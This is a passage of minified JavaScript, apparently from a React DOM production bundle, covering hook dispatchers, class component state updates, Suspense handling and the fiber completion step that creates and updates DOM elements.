Xr={readContext:Ee,useCallback:ne,useContext:ne,useEffect:ne,useImperativeHandle:ne,useInsertionEffect:ne,useLayoutEffect:ne,useMemo:ne,useReducer:ne,useRef:ne,useState:ne,useDebugValue:ne,useDeferredValue:ne,useTransition:ne,useMutableSource:ne,useSyncExternalStore:ne,useId:ne,unstable_isNewReconciler:!1},uf={readContext:Ee,useCallback:function(e,t){return Ie().memoizedState=[e,t===void 0?null:t],e},useContext:Ee,useEffect:Ei,useImperativeHandle:function(e,t,n){return n=n!=null?n.concat([e]):null,jr(4194308,4,Cu.bind(null,t,e),n)},useLayoutEffect:function(e,t){return jr(4194308,4,e,t)},useInsertionEffect:function(e,t){return jr(4,2,e,t)},useMemo:function(e,t){var n=Ie();return t=t===void 0?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var r=Ie();return t=n!==void 0?n(t):t,r.memoizedState=r.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},r.queue=e,e=e.dispatch=sf.bind(null,H,e),[r.memoizedState,e]},useRef:function(e){var t=Ie();return e={current:e},t.memoizedState=e},useState:Ti,useDebugValue:Ts,useDeferredValue:function(e){return Ie().memoizedState=e},useTransition:function(){var e=Ti(!1),t=e[0];return e=lf.bind(null,e[1]),Ie().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var r=H,o=Ie();if(F){if(n===void 0)throw Error(S(407));n=n()}else{if(n=t(),q===null)throw Error(S(349));Rt&30||mu(r,t,n)}o.memoizedState=n;var l={value:n,getSnapshot:t};return o.queue=l,Ei(gu.bind(null,r,l,e),[e]),r.flags|=2048,Kn(9,hu.bind(null,r,l,n,t),void 0,null),n},useId:function(){var e=Ie(),t=q.identifierPrefix;if(F){var n=Be,r=We;n=(r&~(1<<32-Le(r)-1)).toString(32)+n,t=":"+t+"R"+n,n=Gn++,0<n&&(t+="H"+n.toString(32)),t+=":"}else n=of++,t=":"+t+"r"+n.toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},cf={readContext:Ee,useCallback:Tu,useContext:Ee,useEffect:xs,useImperativeHandle:xu,useInsertionEffect:wu,useLayoutEffect:ku,useMemo:Eu,useReducer:Bo,useRef:Su,useState:function(){return Bo($n)},useDebugValue:Ts,useDeferredValue:function(e){var t=Pe();return Pu(t,K.memoizedState,e)},useTransition:function(){var e=Bo($n)[0],t=Pe().memoizedState;return[e,t]},useMutableSource:fu,useSyncExternalStore:pu,useId:ju,unstable_isNewReconciler:!1},df={readContext:Ee,useCallback:Tu,useContext:Ee,useEffect:xs,useImperativeHandle:xu,useInsertionEffect:wu,useLayoutEffect:ku,useMemo:Eu,useReducer:Vo,useRef:Su,useState:function(){return Vo($n)},useDebugValue:Ts,useDeferredValue:function(e){var t=Pe();return K===null?t.memoizedState=e:Pu(t,K.memoizedState,e)},useTransition:function(){var e=Vo($n)[0],t=Pe().memoizedState;return[e,t]},useMutableSource:fu,useSyncExternalStore:pu,useId:ju,unstable_isNewReconciler:!1};function Me(e,t){if(e&&e.defaultProps){t=U({},t),e=e.defaultProps;for(var n in e)t[n]===void 0&&(t[n]=e[n]);return t}return t}function Pl(e,t,n,r){t=e.memoizedState,n=n(r,t),n=n==null?t:U({},t,n),e.memoizedState=n,e.lanes===0&&(e.updateQueue.baseState=n)}var fo={isMounted:function(e){return(e=e._reactInternals)?Lt(e)===e:!1},enqueueSetState:function(e,t,n){e=e._reactInternals;var r=ie(),o=ct(e),l=Ve(r,o);l.payload=t,n!=null&&(l.callback=n),t=at(e,l,o),t!==null&&(Ne(t,e,o,r),Er(t,e,o))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=ie(),o=ct(e),l=Ve(r,o);l.tag=1,l.payload=t,n!=null&&(l.callback=n),t=at(e,l,o),t!==null&&(Ne(t,e,o,r),Er(t,e,o))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=ie(),r=ct(e),o=Ve(n,r);o.tag=2,t!=null&&(o.callback=t),t=at(e,o,r),t!==null&&(Ne(t,e,r,n),Er(t,e,r))}};function Pi(e,t,n,r,o,l,s){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(r,l,s):t.prototype&&t.prototype.isPureReactComponent?!Hn(n,r)||!Hn(o,l):!0}function Du(e,t,n){var r=!1,o=pt,l=t.contextType;return typeof l=="object"&&l!==null?l=Ee(l):(o=pe(t)?Pt:le.current,r=t.contextTypes,l=(r=r!=null)?en(e,o):pt),t=new t(n,l),e.memoizedState=t.state!==null&&t.state!==void 0?t.state:null,t.updater=fo,e.stateNode=t,t._reactInternals=e,r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=o,e.__reactInternalMemoizedMaskedChildContext=l),t}function ji(e,t,n,r){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(n,r),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&fo.enqueueReplaceState(t,t.state,null)}function jl(e,t,n,r){var o=e.stateNode;o.props=n,o.state=e.memoizedState,o.refs={},gs(e);var l=t.contextType;typeof l=="object"&&l!==null?o.context=Ee(l):(l=pe(t)?Pt:le.current,o.context=en(e,l)),o.state=e.memoizedState,l=t.getDerivedStateFromProps,typeof l=="function"&&(Pl(e,t,l,n),o.state=e.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof o.getSnapshotBeforeUpdate=="function"||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(t=o.state,typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount(),t!==o.state&&fo.enqueueReplaceState(o,o.state,null),$r(e,n,o,r),o.state=e.memoizedState),typeof o.componentDidMount=="function"&&(e.flags|=4194308)}function on(e,t){try{var n="",r=t;do n+=Fc(r),r=r.return;while(r);var o=n}catch(l){o=`
Error generating stack: `+l.message+`
`+l.stack}return{value:e,source:t,stack:o,digest:null}}function Jo(e,t,n){return{value:e,source:null,stack:n??null,digest:t??null}}function Rl(e,t){try{console.error(t.value)}catch(n){setTimeout(function(){throw n})}}var ff=typeof WeakMap=="function"?WeakMap:Map;function Lu(e,t,n){n=Ve(-1,n),n.tag=3,n.payload={element:null};var r=t.value;return n.callback=function(){qr||(qr=!0,Fl=r),Rl(e,t)},n}function Nu(e,t,n){n=Ve(-1,n),n.tag=3;var r=e.type.getDerivedStateFromError;if(typeof r=="function"){var o=t.value;n.payload=function(){return r(o)},n.callback=function(){Rl(e,t)}}var l=e.stateNode;return l!==null&&typeof l.componentDidCatch=="function"&&(n.callback=function(){Rl(e,t),typeof r!="function"&&(ut===null?ut=new Set([this]):ut.add(this));var s=t.stack;this.componentDidCatch(t.value,{componentStack:s!==null?s:""})}),n}function Ri(e,t,n){var r=e.pingCache;if(r===null){r=e.pingCache=new ff;var o=new Set;r.set(t,o)}else o=r.get(t),o===void 0&&(o=new Set,r.set(t,o));o.has(n)||(o.add(n),e=Pf.bind(null,e,t,n),t.then(e,e))}function Mi(e){do{var t;if((t=e.tag===13)&&(t=e.memoizedState,t=t!==null?t.dehydrated!==null:!0),t)return e;e=e.return}while(e!==null);return null}function bi(e,t,n,r,o){return e.mode&1?(e.flags|=65536,e.lanes=o,e):(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(t=Ve(-1,1),t.tag=2,at(n,t,1))),n.lanes|=1),e)}var pf=Qe.ReactCurrentOwner,de=!1;function se(e,t,n,r){t.child=e===null?au(t,null,n,r):nn(t,e.child,n,r)}function Di(e,t,n,r,o){n=n.render;var l=t.ref;return Yt(t,o),r=ks(e,t,n,r,l,o),n=Cs(),e!==null&&!de?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~o,Ke(e,t,o)):(F&&n&&us(t),t.flags|=1,se(e,t,r,o),t.child)}function Li(e,t,n,r,o){if(e===null){var l=n.type;return typeof l=="function"&&!Ls(l)&&l.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(t.tag=15,t.type=l,Ou(e,t,l,r,o)):(e=Dr(n.type,null,r,t,t.mode,o),e.ref=t.ref,e.return=t,t.child=e)}if(l=e.child,!(e.lanes&o)){var s=l.memoizedProps;if(n=n.compare,n=n!==null?n:Hn,n(s,r)&&e.ref===t.ref)return Ke(e,t,o)}return t.flags|=1,e=dt(l,r),e.ref=t.ref,e.return=t,t.child=e}function Ou(e,t,n,r,o){if(e!==null){var l=e.memoizedProps;if(Hn(l,r)&&e.ref===t.ref)if(de=!1,t.pendingProps=r=l,(e.lanes&o)!==0)e.flags&131072&&(de=!0);else return t.lanes=e.lanes,Ke(e,t,o)}return Ml(e,t,n,r,o)}function Au(e,t,n){var r=t.pendingProps,o=r.children,l=e!==null?e.memoizedState:null;if(r.mode==="hidden")if(!(t.mode&1))t.memoizedState={baseLanes:0,cachePool:null,transitions:null},A(Gt,he),he|=n;else{if(!(n&1073741824))return e=l!==null?l.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,A(Gt,he),he|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=l!==null?l.baseLanes:n,A(Gt,he),he|=r}else l!==null?(r=l.baseLanes|n,t.memoizedState=null):r=n,A(Gt,he),he|=r;return se(e,t,o,n),t.child}function Iu(e,t){var n=t.ref;(e===null&&n!==null||e!==null&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function Ml(e,t,n,r,o){var l=pe(n)?Pt:le.current;return l=en(t,l),Yt(t,o),n=ks(e,t,n,r,l,o),r=Cs(),e!==null&&!de?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~o,Ke(e,t,o)):(F&&r&&us(t),t.flags|=1,se(e,t,n,o),t.child)}function Ni(e,t,n,r,o){if(pe(n)){var l=!0;Wr(t)}else l=!1;if(Yt(t,o),t.stateNode===null)Rr(e,t),Du(t,n,r),jl(t,n,r,o),r=!0;else if(e===null){var s=t.stateNode,i=t.memoizedProps;s.props=i;var a=s.context,c=n.contextType;typeof c=="object"&&c!==null?c=Ee(c):(c=pe(n)?Pt:le.current,c=en(t,c));var g=n.getDerivedStateFromProps,f=typeof g=="function"||typeof s.getSnapshotBeforeUpdate=="function";f||typeof s.UNSAFE_componentWillReceiveProps!="function"&&typeof s.componentWillReceiveProps!="function"||(i!==r||a!==c)&&ji(t,s,r,c),Ze=!1;var h=t.memoizedState;s.state=h,$r(t,r,s,o),a=t.memoizedState,i!==r||h!==a||fe.current||Ze?(typeof g=="function"&&(Pl(t,n,g,r),a=t.memoizedState),(i=Ze||Pi(t,n,i,r,h,a,c))?(f||typeof s.UNSAFE_componentWillMount!="function"&&typeof s.componentWillMount!="function"||(typeof s.componentWillMount=="function"&&s.componentWillMount(),typeof s.UNSAFE_componentWillMount=="function"&&s.UNSAFE_componentWillMount()),typeof s.componentDidMount=="function"&&(t.flags|=4194308)):(typeof s.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=a),s.props=r,s.state=a,s.context=c,r=i):(typeof s.componentDidMount=="function"&&(t.flags|=4194308),r=!1)}else{s=t.stateNode,cu(e,t),i=t.memoizedProps,c=t.type===t.elementType?i:Me(t.type,i),s.props=c,f=t.pendingProps,h=s.context,a=n.contextType,typeof a=="object"&&a!==null?a=Ee(a):(a=pe(n)?Pt:le.current,a=en(t,a));var k=n.getDerivedStateFromProps;(g=typeof k=="function"||typeof s.getSnapshotBeforeUpdate=="function")||typeof s.UNSAFE_componentWillReceiveProps!="function"&&typeof s.componentWillReceiveProps!="function"||(i!==f||h!==a)&&ji(t,s,r,a),Ze=!1,h=t.memoizedState,s.state=h,$r(t,r,s,o);var w=t.memoizedState;i!==f||h!==w||fe.current||Ze?(typeof k=="function"&&(Pl(t,n,k,r),w=t.memoizedState),(c=Ze||Pi(t,n,c,r,h,w,a)||!1)?(g||typeof s.UNSAFE_componentWillUpdate!="function"&&typeof s.componentWillUpdate!="function"||(typeof s.componentWillUpdate=="function"&&s.componentWillUpdate(r,w,a),typeof s.UNSAFE_componentWillUpdate=="function"&&s.UNSAFE_componentWillUpdate(r,w,a)),typeof s.componentDidUpdate=="function"&&(t.flags|=4),typeof s.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof s.componentDidUpdate!="function"||i===e.memoizedProps&&h===e.memoizedState||(t.flags|=4),typeof s.getSnapshotBeforeUpdate!="function"||i===e.memoizedProps&&h===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=w),s.props=r,s.state=w,s.context=a,r=c):(typeof s.componentDidUpdate!="function"||i===e.memoizedProps&&h===e.memoizedState||(t.flags|=4),typeof s.getSnapshotBeforeUpdate!="function"||i===e.memoizedProps&&h===e.memoizedState||(t.flags|=1024),r=!1)}return bl(e,t,n,r,l,o)}function bl(e,t,n,r,o,l){Iu(e,t);var s=(t.flags&128)!==0;if(!r&&!s)return o&&yi(t,n,!1),Ke(e,t,l);r=t.stateNode,pf.current=t;var i=s&&typeof n.getDerivedStateFromError!="function"?null:r.render();return t.flags|=1,e!==null&&s?(t.child=nn(t,e.child,null,l),t.child=nn(t,null,i,l)):se(e,t,i,l),t.memoizedState=r.state,o&&yi(t,n,!0),t.child}function _u(e){var t=e.stateNode;t.pendingContext?vi(e,t.pendingContext,t.pendingContext!==t.context):t.context&&vi(e,t.context,!1),vs(e,t.containerInfo)}function Oi(e,t,n,r,o){return tn(),ds(o),t.flags|=256,se(e,t,n,r),t.child}var Dl={dehydrated:null,treeContext:null,retryLane:0};function Ll(e){return{baseLanes:e,cachePool:null,transitions:null}}function Fu(e,t,n){var r=t.pendingProps,o=z.current,l=!1,s=(t.flags&128)!==0,i;if((i=s)||(i=e!==null&&e.memoizedState===null?!1:(o&2)!==0),i?(l=!0,t.flags&=-129):(e===null||e.memoizedState!==null)&&(o|=1),A(z,o&1),e===null)return Tl(t),e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(t.mode&1?e.data==="$!"?t.lanes=8:t.lanes=1073741824:t.lanes=1,null):(s=r.children,e=r.fallback,l?(r=t.mode,l=t.child,s={mode:"hidden",children:s},!(r&1)&&l!==null?(l.childLanes=0,l.pendingProps=s):l=ho(s,r,0,null),e=Et(e,r,n,null),l.return=t,e.return=t,l.sibling=e,t.child=l,t.child.memoizedState=Ll(n),t.memoizedState=Dl,e):Es(t,s));if(o=e.memoizedState,o!==null&&(i=o.dehydrated,i!==null))return mf(e,t,s,r,i,o,n);if(l){l=r.fallback,s=t.mode,o=e.child,i=o.sibling;var a={mode:"hidden",children:r.children};return!(s&1)&&t.child!==o?(r=t.child,r.childLanes=0,r.pendingProps=a,t.deletions=null):(r=dt(o,a),r.subtreeFlags=o.subtreeFlags&14680064),i!==null?l=dt(i,l):(l=Et(l,s,n,null),l.flags|=2),l.return=t,r.return=t,r.sibling=l,t.child=r,r=l,l=t.child,s=e.child.memoizedState,s=s===null?Ll(n):{baseLanes:s.baseLanes|n,cachePool:null,transitions:s.transitions},l.memoizedState=s,l.childLanes=e.childLanes&~n,t.memoizedState=Dl,r}return l=e.child,e=l.sibling,r=dt(l,{mode:"visible",children:r.children}),!(t.mode&1)&&(r.lanes=n),r.return=t,r.sibling=null,e!==null&&(n=t.deletions,n===null?(t.deletions=[e],t.flags|=16):n.push(e)),t.child=r,t.memoizedState=null,r}function Es(e,t){return t=ho({mode:"visible",children:t},e.mode,0,null),t.return=e,e.child=t}function gr(e,t,n,r){return r!==null&&ds(r),nn(t,e.child,null,n),e=Es(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function mf(e,t,n,r,o,l,s){if(n)return t.flags&256?(t.flags&=-257,r=Jo(Error(S(422))),gr(e,t,s,r)):t.memoizedState!==null?(t.child=e.child,t.flags|=128,null):(l=r.fallback,o=t.mode,r=ho({mode:"visible",children:r.children},o,0,null),l=Et(l,o,s,null),l.flags|=2,r.return=t,l.return=t,r.sibling=l,t.child=r,t.mode&1&&nn(t,e.child,null,s),t.child.memoizedState=Ll(s),t.memoizedState=Dl,l);if(!(t.mode&1))return gr(e,t,s,null);if(o.data==="$!"){if(r=o.nextSibling&&o.nextSibling.dataset,r)var i=r.dgst;return r=i,l=Error(S(419)),r=Jo(l,r,void 0),gr(e,t,s,r)}if(i=(s&e.childLanes)!==0,de||i){if(r=q,r!==null){switch(s&-s){case 4:o=2;break;case 16:o=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:o=32;break;case 536870912:o=268435456;break;default:o=0}o=o&(r.suspendedLanes|s)?0:o,o!==0&&o!==l.retryLane&&(l.retryLane=o,$e(e,o),Ne(r,e,o,-1))}return Ds(),r=Jo(Error(S(421))),gr(e,t,s,r)}return o.data==="$?"?(t.flags|=128,t.child=e.child,t=jf.bind(null,e),o._reactRetry=t,null):(e=l.treeContext,ge=it(o.nextSibling),ve=t,F=!0,De=null,e!==null&&(ke[Ce++]=We,ke[Ce++]=Be,ke[Ce++]=jt,We=e.id,Be=e.overflow,jt=t),t=Es(t,r.children),t.flags|=4096,t)}function Ai(e,t,n){e.lanes|=t;var r=e.alternate;r!==null&&(r.lanes|=t),El(e.return,t,n)}function Go(e,t,n,r,o){var l=e.memoizedState;l===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:o}:(l.isBackwards=t,l.rendering=null,l.renderingStartTime=0,l.last=r,l.tail=n,l.tailMode=o)}function zu(e,t,n){var r=t.pendingProps,o=r.revealOrder,l=r.tail;if(se(e,t,r.children,n),r=z.current,r&2)r=r&1|2,t.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Ai(e,n,t);else if(e.tag===19)Ai(e,n,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}r&=1}if(A(z,r),!(t.mode&1))t.memoizedState=null;else switch(o){case"forwards":for(n=t.child,o=null;n!==null;)e=n.alternate,e!==null&&Kr(e)===null&&(o=n),n=n.sibling;n=o,n===null?(o=t.child,t.child=null):(o=n.sibling,n.sibling=null),Go(t,!1,o,n,l);break;case"backwards":for(n=null,o=t.child,t.child=null;o!==null;){if(e=o.alternate,e!==null&&Kr(e)===null){t.child=o;break}e=o.sibling,o.sibling=n,n=o,o=e}Go(t,!0,n,null,l);break;case"together":Go(t,!1,null,null,void 0);break;default:t.memoizedState=null}return t.child}function Rr(e,t){!(t.mode&1)&&e!==null&&(e.alternate=null,t.alternate=null,t.flags|=2)}function Ke(e,t,n){if(e!==null&&(t.dependencies=e.dependencies),Mt|=t.lanes,!(n&t.childLanes))return null;if(e!==null&&t.child!==e.child)throw Error(S(153));if(t.child!==null){for(e=t.child,n=dt(e,e.pendingProps),t.child=n,n.return=t;e.sibling!==null;)e=e.sibling,n=n.sibling=dt(e,e.pendingProps),n.return=t;n.sibling=null}return t.child}function hf(e,t,n){switch(t.tag){case 3:_u(t),tn();break;case 5:du(t);break;case 1:pe(t.type)&&Wr(t);break;case 4:vs(t,t.stateNode.containerInfo);break;case 10:var r=t.type._context,o=t.memoizedProps.value;A(Jr,r._currentValue),r._currentValue=o;break;case 13:if(r=t.memoizedState,r!==null)return r.dehydrated!==null?(A(z,z.current&1),t.flags|=128,null):n&t.child.childLanes?Fu(e,t,n):(A(z,z.current&1),e=Ke(e,t,n),e!==null?e.sibling:null);A(z,z.current&1);break;case 19:if(r=(n&t.childLanes)!==0,e.flags&128){if(r)return zu(e,t,n);t.flags|=128}if(o=t.memoizedState,o!==null&&(o.rendering=null,o.tail=null,o.lastEffect=null),A(z,z.current),r)break;return null;case 22:case 23:return t.lanes=0,Au(e,t,n)}return Ke(e,t,n)}var Hu,Nl,Uu,Wu;Hu=function(e,t){for(var n=t.child;n!==null;){if(n.tag===5||n.tag===6)e.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===t)break;for(;n.sibling===null;){if(n.return===null||n.return===t)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};Nl=function(){};Uu=function(e,t,n,r){var o=e.memoizedProps;if(o!==r){e=t.stateNode,xt(ze.current);var l=null;switch(n){case"input":o=tl(e,o),r=tl(e,r),l=[];break;case"select":o=U({},o,{value:void 0}),r=U({},r,{value:void 0}),l=[];break;case"textarea":o=ol(e,o),r=ol(e,r),l=[];break;default:typeof o.onClick!="function"&&typeof r.onClick=="function"&&(e.onclick=Hr)}sl(n,r);var s;n=null;for(c in o)if(!r.hasOwnProperty(c)&&o.hasOwnProperty(c)&&o[c]!=null)if(c==="style"){var i=o[c];for(s in i)i.hasOwnProperty(s)&&(n||(n={}),n[s]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(Nn.hasOwnProperty(c)?l||(l=[]):(l=l||[]).push(c,null));for(c in r){var a=r[c];if(i=o!=null?o[c]:void 0,r.hasOwnProperty(c)&&a!==i&&(a!=null||i!=null))if(c==="style")if(i){for(s in i)!i.hasOwnProperty(s)||a&&a.hasOwnProperty(s)||(n||(n={}),n[s]="");for(s in a)a.hasOwnProperty(s)&&i[s]!==a[s]&&(n||(n={}),n[s]=a[s])}else n||(l||(l=[]),l.push(c,n)),n=a;else c==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,i=i?i.__html:void 0,a!=null&&i!==a&&(l=l||[]).push(c,a)):c==="children"?typeof a!="string"&&typeof a!="number"||(l=l||[]).push(c,""+a):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(Nn.hasOwnProperty(c)?(a!=null&&c==="onScroll"&&I("scroll",e),l||i===a||(l=[])):(l=l||[]).push(c,a))}n&&(l=l||[]).push("style",n);var c=l;(t.updateQueue=c)&&(t.flags|=4)}};Wu=function(e,t,n,r){n!==r&&(t.flags|=4)};function yn(e,t){if(!F)switch(e.tailMode){case"hidden":t=e.tail;for(var n=null;t!==null;)t.alternate!==null&&(n=t),t=t.sibling;n===null?e.tail=null:n.sibling=null;break;case"collapsed":n=e.tail;for(var r=null;n!==null;)n.alternate!==null&&(r=n),n=n.sibling;r===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:r.sibling=null}}function re(e){var t=e.alternate!==null&&e.alternate.child===e.child,n=0,r=0;if(t)for(var o=e.child;o!==null;)n|=o.lanes|o.childLanes,r|=o.subtreeFlags&14680064,r|=o.flags&14680064,o.return=e,o=o.sibling;else for(o=e.child;o!==null;)n|=o.lanes|o.childLanes,r|=o.subtreeFlags,r|=o.flags,o.return=e,o=o.sibling;return e.subtreeFlags|=r,e.childLanes=n,t}function gf(e,t,n){var r=t.pendingProps;switch(cs(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return re(t),null;case 1:return pe(t.type)&&Ur(),re(t),null;case 3:return r=t.stateNode,rn(),_(fe),_(le),Ss(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(e===null||e.child===null)&&(mr(t)?t.flags|=4:e===null||e.memoizedState.isDehydrated&&!(t.flags&256)||(t.flags|=1024,De!==null&&(Ul(De),De=null))),Nl(e,t),re(t),null;case 5:ys(t);var o=xt(Jn.current);if(n=t.type,e!==null&&t.stateNode!=null)Uu(e,t,n,r,o),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!r){if(t.stateNode===null)throw Error(S(166));return re(t),null}if(e=xt(ze.current),mr(t)){r=t.stateNode,n=t.type;var l=t.memoizedProps;switch(r[_e]=t,r[Bn]=l,e=(t.mode&1)!==0,n){case"dialog":I("cancel",r),I("close",r);break;case"iframe":case"object":case"embed":I("load",r);break;case"video":case"audio":for(o=0;o<xn.length;o++)I(xn[o],r);break;case"source":I("error",r);break;case"img":case"image":case"link":I("error",r),I("load",r);break;case"details":I("toggle",r);break;case"input":Vs(r,l),I("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!l.multiple},I("invalid",r);break;case"textarea":Gs(r,l),I("invalid",r)}sl(n,l),o=null;for(var s in l)if(l.hasOwnProperty(s)){var i=l[s];s==="children"?typeof i=="string"?r.textContent!==i&&(l.suppressHydrationWarning!==!0&&pr(r.textContent,i,e),o=["children",i]):typeof i=="number"&&r.textContent!==""+i&&(l.suppressHydrationWarning!==!0&&pr(r.textContent,i,e),o=["children",""+i]):Nn.hasOwnProperty(s)&&i!=null&&s==="onScroll"&&I("scroll",r)}switch(n){case"input":lr(r),Js(r,l,!0);break;case"textarea":lr(r),$s(r);break;case"select":case"option":break;default:typeof l.onClick=="function"&&(r.onclick=Hr)}r=o,t.updateQueue=r,r!==null&&(t.flags|=4)}else{s=o.nodeType===9?o:o.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=ga(n)),e==="http://www.w3.org/1999/xhtml"?n==="script"?(e=s.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof r.is=="string"?e=s.createElement(n,{is:r.is}):(e=s.createElement(n),n==="select"&&(s=e,r.multiple?s.multiple=!0:r.size&&(s.size=r.size))):e=s.createElementNS(e,n),e[_e]=t,e[Bn]=r,Hu(e,t,!1,!1),t.stateNode=e;e:{switch(s=il(n,r),n){case"dialog":I("cancel",e),I("close",e),o=r;break;case"iframe":case"object":case"embed":I("load",e),o=r;break;case"video":case"audio":for(o=0;o<xn.length;o++)I(xn[o],e);o=r;break;case"source":I("error",e),o=r;break;case"img":case"image":case"link":I("error",e),I("load",e),o=r;break;case"details":I("toggle",e),o=r;break;case"input":Vs(e,r),o=tl(e,r),I("invalid",e);break;case"option":o=r;break;case"select":e._wrapperState={wasMultiple:!!r.multiple},o=U({},r,{value:void 0}),I("invalid",e);break;case"textarea":Gs(e,r),o=ol(e,r),I("invalid",e);break;default:o=r}sl(n,o),i=o;for(l in i)if(i.hasOwnProperty(l)){var a=i[l];l==="style"?Sa(e,a):l==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,a!=null&&va(e,a)):l==="children"?typeof a=="string"?(n!=="textarea"||a!=="")&&On(e,a):typeof a=="number"&&On(e,""+a):l!=="suppressContentEditableWarning"&&l!=="suppressHydrationWarning"&&l!=="autoFocus"&&(Nn.hasOwnProperty(l)?a!=null&&l==="onScroll"&&I("scroll",e):a!=null&&Ql(e,l,a,s))}switch(n){case"input":lr(e),Js(e,r,!1);break;case"textarea":lr(e),$s(e);break;case"option":r.value!=null&&e.setAttribute("value",""+ft(r.value));break;case"select":e.multiple=!!r.multiple,l=r.value,l!=null?$t(e,!!r.multiple,l,!1):r.defaultValue!=null&&$t(e,!!r.multiple,r.defaultValue,!0);break;default:typeof o.onClick=="function"&&(e.onclick=Hr)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(t.flags|=4)}t.ref!==null&&(t.flags|=512,t.flags|=2097152)}return re(t),null;case 6:if(e&&t.stateNode!=null)Wu(e,t,e.memoizedProps,r);else{if(typeof r!="string"&&t.stateNode===null)throw Error(S(166));if(n=xt(Jn.current),xt(ze.current),mr(t)){if(r=t.stateNode,n=t.memoizedProps,r[_e]=t,(l=r.nodeValue!==n)&&(e=ve,e!==null))switch(e.tag){case 3:pr(r.nodeValue,n,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&pr(r.nodeValue,n,(e.mode&1)!==0)}l&&(t.flags|=4)}else r=(n.nodeType===9?n:n.ownerDocument).createTextNode(r),r[_e]=t,t.stateNode=r}return re(t),null;case 13:if(_(z),r=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(F&&ge!==null&&t.mode&1&&!(t.flags&128))su(),tn(),t.flags|=98560,l=!1;else if(l=mr(t),r!==null&&r.dehydrated!==null){if(e===null){if(!l)throw Error(S(318));if(l=t.memoizedState,l=l!==null?l.dehydrated:null,!l)throw Error(S(317));l[_e]=t}else tn(),!(t.flags&128)&&(t.memoizedState=null),t.flags|=4;re(t),l=!1}else De!==null&&(Ul(De),De=null),l=!0;if(!l)return t.flags&65536?t:null}return t.flags&128?(t.lanes=n,t):(r=r!==null,r!==(e!==null&&e.memoizedState!==null)&&r&&(t.child.flags|=8192,t.mode&1&&(e===null||z.current&1?Q===0&&(Q=3):Ds())),t.updateQueue!==null&&(t.flags|=4),re(t),null);case 4:return rn(),Nl(e,t),e===null&&Un(t.stateNode.containerInfo),re(t),null;case 10:return ms(t.type._context),re(t),null;case 17:return pe(t.type)&&Ur(),re(t),null;case 19:if(_(z),l=t.memoizedState,l===null)return 